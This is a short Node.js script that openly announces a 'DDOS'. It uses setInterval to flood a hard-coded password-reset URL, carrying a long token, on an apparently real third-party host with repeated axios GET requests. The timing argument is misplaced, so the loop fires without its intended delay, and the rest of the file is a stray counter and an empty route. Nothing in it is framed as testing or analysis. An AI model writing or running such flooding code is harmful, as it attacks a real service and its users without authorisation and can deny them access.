const express = require('express');
const app = express();
const port = process.env.port || 3100;
const url = 'https://ibsapps.ibstower.com/password/newpassword/fGn4iRahT2WfXVYeHnBuX11KT1d3m5aQgC7ha6pps13lCl69JMNfkJcLN426Dr1uGnPFqTgigxtdfAwLSCnEdPtjweq14eq14/B8sYFbC0gDAxCBXR0ums4v9v39NFmRRSWX0eWTXxryjhrjRGp7pGqteh9bVF6H2cqxXsEb1akFVPQUccmhss11cSgeq14eq14'
const axios = require('axios');
app.listen(port, () => console.log(`=> START DDOS ON ${port}`));
let a =1;
setInterval(function(){
  axios.get(url),60000;
});
console.log(a++);

app.get('/api', (req,res) => {
res.send()
});
